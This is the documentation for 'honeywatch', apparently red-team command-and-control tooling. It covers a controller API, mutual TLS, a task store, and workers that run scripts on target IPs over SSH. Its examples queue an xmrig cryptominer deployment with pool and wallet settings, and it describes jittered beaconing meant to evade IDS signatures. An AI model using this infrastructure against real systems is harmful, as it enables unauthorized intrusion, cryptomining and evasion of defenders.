# C2 Controller

`honeywatch/c2/` — control plane for red-team operations. Dashboard, REST API, and WebSocket live updates. Requires `pip install honeywatch[c2]` (`aiohttp>=3.8`, `websockets>=12.0`). Source: `c2/controller.py:411`, `c2/store.py:424`, `c2/worker.py:332`, `c2/tls.py:132`.

## Starting the Controller

```bash
pip install honeywatch[c2]

# Generate self-signed certs and start dashboard
honeywatch c2 --generate-certs --skip-vpn-check
# → certs/honeywatch.crt, certs/honeywatch.key, https://127.0.0.1:8443/

# Provide your own TLS
honeywatch c2 --tls-cert certs/honeywatch.crt --tls-key certs/honeywatch.key

# With bearer token
honeywatch c2 --api-token secret --skip-vpn-check
# workers must use the same token

# Custom bind / DB
honeywatch c2 --host 0.0.0.0 --port 8443 --db honeywatch.db --skip-vpn-check
```

Config keys (`config.toml` `[c2]`):

```toml
[c2]
enabled = false
host = "0.0.0.0"
port = 8443
# tls_cert = "certs/honeywatch.crt"
# tls_key = "certs/honeywatch.key"
# api_token = "shared-secret"
# db = "honeywatch.db"
```

`honeywatch/cli.py:890` `_cmd_c2` builds `C2Store`, `build_ssl_context`, `Controller(...).run()`.

## Dashboard

Served at `GET /` — `_DASHBOARD_HTML` (`controller.py:411`) with CSS vars, grid of workers / operations / tasks / events. JavaScript opens `wss://` or `ws://` to `/ws` and renders live snapshots. For production, front with nginx (see TLS section).

## REST API

All handlers in `Controller` (`controller.py:411`). When `api_token` is set, every request must carry `Authorization: Bearer <token>` header or `?token=<token>` query (`_build_auth_middleware`, `_authorized`).

| Method | Path | Description |
|---|---|---|
| `GET` | `/` | dashboard HTML |
| `GET` | `/ws` | WebSocket (401 if unauthorized) |
| `GET` | `/api/health` | `{ok: true}` |
| `GET` | `/api/workers` | list workers (query `active_within_s`) |
| `GET` | `/api/operations?status=&limit=` | list operations |
| `POST` | `/api/operations` | create operation `{payload_id, target_ips, manifest}` → `{id}` + broadcast `operation_created` |
| `GET` | `/api/tasks?operation_id=&status=&worker_id=&limit=` | list tasks |
| `POST` | `/api/tasks/claim` | claim next pending task for `{worker_id, categories}` → task or 204 + broadcast `task_claimed` |
| `POST` | `/api/tasks/{task_id}/result` | complete task `{worker_id, success, result}` + broadcast `task_completed` |

Helpers: `_json_response`, `_op_dict`, `_task_dict`, `_target_to_dict`.

### Create operation via API

```bash
curl -X POST https://127.0.0.1:8443/api/operations \
  -H "Authorization: Bearer secret" -k \
  -H "Content-Type: application/json" \
  -d '{"payload_id":"xmrig","target_ips":["1.2.3.4"],"manifest":{"variables":{"pool":"stratum+tcp://pool:3333","wallet":"W"},"scripts":{"1.2.3.4":"..."}}}'
```

Or use `honeywatch deploy --controller-url http://127.0.0.1:8443`.

## WebSocket

`GET /ws` — after auth, `_websocket` handler:

- Pushes snapshot (`_push_snapshot`) of workers/operations/tasks.
- Handles `ping`→`pong`, `register_worker` messages.
- Broadcasts `operation_created`, `task_claimed`, `task_completed` to all `_clients: list[WebSocketResponse]`.

Workers can use WebSocket transport instead of polling — see Worker.

## Mutual TLS (`c2/ca.py`, `c2/tls.py`)

The controller/worker plane is plaintext by default (lab). For production the
controller can require **mutual TLS**: every worker must present a client
certificate chaining to an internal CA, so only CA-signed workers even complete
the TLS handshake. The bearer token stays as a second factor (mTLS = something
you have, token = something you know).

The internal CA is created with the `openssl` binary (the runtime stays
stdlib-only; `cryptography` is not required):

```python
from honeywatch.c2.ca import generate_ca, sign_server_cert, sign_worker_cert, ca_pin_from_cert, cert_serial

# 1. internal CA (CA:TRUE, keyCertSign+cRLSign)
generate_ca("certs/honeywatch-ca.crt", "certs/honeywatch-ca.key")

# 2. controller server cert -- MUST chain to the CA (the worker pins the CA,
#    so a self-signed server cert would be rejected at the handshake)
sign_server_cert("certs/honeywatch-ca.crt", "certs/honeywatch-ca.key",
                 "certs/honeywatch-controller.crt", "certs/honeywatch-controller.key",
                 hostname="honeywatch.local")

# 3. a worker client cert (clientAuth EKU, CA:FALSE)
sign_worker_cert("certs/honeywatch-ca.crt", "certs/honeywatch-ca.key",
                 "certs/worker-1.crt", "certs/worker-1.key", worker_id="worker-1")

ca_pin = ca_pin_from_cert("certs/honeywatch-ca.crt")  # "sha256:..."
serial  = cert_serial("certs/worker-1.crt")           # int, for revocation
```

**CA pinning** — the worker's client SSL context trusts *only* the internal CA
(`load_verify_locations(ca)` + `CERT_REQUIRED`), so a public-CA-issued impostor
cannot validate. `check_hostname` is disabled (the CA pin is the trust anchor,
not the DNS name; controllers are often reached by IP). `ca_pin` is the CA cert's
SHA-256 fingerprint, checked constant-time (`hmac.compare_digest`) *before* the
CA file is trusted — guards against on-disk CA substitution (an attacker who
swaps the CA file to MITM with their own cert is rejected).

**Server side** — `build_mtls_server_ssl_context(cert, key, ca_path)` builds a
server context that additionally `load_verify_locations(ca)` + `CERT_REQUIRED`,
so only CA-signed workers complete the handshake. The controller enforces an
app-layer **revocation list** (`revoke_serial` / `--revoke-serial`): a presented
but revoked cert is rejected with `403` even though it passes the TLS handshake.
Client-cert serials are read from `request.transport.get_extra_info("peercert")`
(the asyncio SSL transport forwards `getpeercert()`, whose `serialNumber` is an
uppercase hex string — parsed to int for set membership).

### CLI: generate the CA + certs

```bash
# Controller side: generate the CA + a CA-signed server cert, then serve mTLS
honeywatch c2 --generate-ca --port 8443 --api-token $TOKEN

# Mint a worker client cert signed by that CA (prints cert/key + CA pin), then exit
honeywatch c2 --generate-ca --generate-worker-cert worker-1

# Revoke a worker by serial (decimal)
honeywatch c2 --ca certs/honeywatch-ca.crt --revoke-serial <serial> --tls-cert ... --tls-key ...
```

### CLI: run a worker with mTLS

```bash
honeywatch worker --controller-url https://10.0.0.5:8443 \
  --ca certs/honeywatch-ca.crt \
  --worker-cert certs/worker-1.crt --worker-key certs/worker-1.key \
  --ca-pin sha256:... --api-token $TOKEN
```

### Config keys

`[c2]`:


## C2 Store (`c2/store.py`)

- `c2_tasks(id PK, operation_id FK, payload_id, category, target_json, script, variables_json, status, worker_id, result_json, created_at, updated_at)` — status `pending|running|completed|failed`.
- `c2_workers(id PK, categories csv, connected_at, last_seen)` — id `worker-<hex8>`.

**Class `C2Store(db_path)`:**

```python
from honeywatch.c2.store import C2Store

store = C2Store("honeywatch.db")
op = store.create_operation(payload_id="xmrig", target_ips=["1.2.3.4"], manifest={...})  # id op-abc...
store.get_operation(op.id)
store.update_operation_status(op.id, "completed", result={...})  # appends to result_log
store.list_operations(status="running", limit=100)

store.create_task(task: WorkerTask)
task = store.claim_next_task(worker_id="worker-abc", categories=["miner"])  # atomic UPDATE ... WHERE status='pending'
store.complete_task(task_id, worker_id, success=True, result={...})
store.list_tasks(operation_id=op.id, status="pending", limit=50)
store.register_worker(worker_id, categories)  # upsert ON CONFLICT
store.heartbeat_worker(worker_id)
store.list_workers(active_within_s=60)
```

## Worker (`c2/worker.py`)

`honeywatch/c2/worker.py:332` `Worker`.

```python
from honeywatch.c2 import Worker

worker = Worker(
    controller_url="http://127.0.0.1:8443",
    worker_id=None,                    # auto worker-<hex8>
    categories=["miner","exploit"],    # allowed task categories
    exec_mode="dry_run",               # dry_run | local_simulate | ssh
    poll_interval=5.0,                 # base beacon cadence (seconds)
    jitter_fraction=0.2,               # +/- 20% spread around each wait
    max_backoff=60.0,                   # cap on idle/error backoff
    ssh_user="root",
    ssh_key="/path/to/id_rsa",
    api_token="secret",
    # beacon=BeaconProfile(...)          # or pass a pre-built profile (e.g. seeded for tests)
)
await worker.run()   # or worker.run() via asyncio.run in CLI
worker.stop()        # sets _shutdown
```

**Exec modes:**

| Mode | What happens |
|---|---|
| `dry_run` | report `script_length` without running (default, safe for review) |
| `local_simulate` | run the script on the worker host itself via `_run_shell` (temp `.sh`, `chmod 700`, `/bin/sh`, 600 s timeout) |
| `ssh` | run on the target via `_run_ssh` (`ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i key user@ip` with script on stdin) |

**Beacon cadence** (`honeywatch/c2/beacon.py` `BeaconProfile`):

The worker no longer polls on a fixed interval. Each wait is drawn from
`[level - spread, level + spread]` where `level` is the current backoff level
and `spread = level * jitter_fraction` — so the controller flow is not a clean
metronome (a fixed 5s beacon is a classic IDS signature). The level backs off
exponentially on idle (`*1.5`) and controller errors (`*2`), capped at
`max_backoff`, and resets to `poll_interval` on a successful claim/connect. Pass
a seeded `random.Random` to `BeaconProfile(rng=...)` for deterministic beacons
(tests); production seeds from system entropy so two workers don't beacon in
lockstep. CLI: `--jitter` (0.0–1.0) and `--max-backoff`; config `[workers]`
`jitter_fraction` / `max_backoff`.

**Transports:**

- **Polling** (`_run_polling` loop): `claim_task() → execute_task() → report_result()`; idle sleeps `beacon.on_idle()` (jittered, backing off), controller error sleeps `beacon.on_error()` (steeper), task error resets to base.
- **WebSocket** (`_run_websocket`): translate `http→ws`, add `?token=`, send `register_worker`, recv task messages, fallback to HTTP `claim` on timeout; reconnect backs off via `beacon.on_error()`.

**HTTP** (`_request` via `urllib.request`, stdlib):

- `claim_task() -> WorkerTask|None` — `POST /api/tasks/claim` with `{worker_id, categories}`.
- `report_result(task_id, success, result)` — `POST /api/tasks/{id}/result`.
- `execute_task(task) -> dict` — dispatches by `exec_mode`.

`class WorkerError` for `URLError`/`HTTPError` (including 204 empty).

**Starting:**

```bash
honeywatch worker --categories miner --exec-mode dry_run
honeywatch worker --categories miner,exploit --exec-mode ssh --ssh-user admin --ssh-key ~/.ssh/id_rsa --controller-url http://c2:8443
honeywatch worker --categories miner --exec-mode local_simulate --poll-interval 2.0 --jitter 0.3 --max-backoff 90
```

Config `[workers]` keys: `controller_url`, `categories`, `poll_interval`, `jitter_fraction`, `max_backoff`, `exec_mode`, `ssh_user`, `ssh_key`, `api_token`.
